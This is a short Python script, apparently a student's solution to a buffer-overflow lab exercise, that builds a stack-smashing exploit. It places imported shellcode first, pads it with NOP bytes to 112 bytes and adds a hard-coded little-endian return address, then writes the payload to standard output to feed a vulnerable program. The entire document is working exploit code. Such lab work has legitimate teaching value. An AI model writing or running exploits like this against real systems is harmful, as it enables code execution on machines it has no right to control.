import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
nops = b'\x90' * (112 - len(shellcode))
payload = pack("<I", 0xfff6fe7c)


# Launch the attack!
sys.stdout.buffer.write(shellcode + nops + payload)
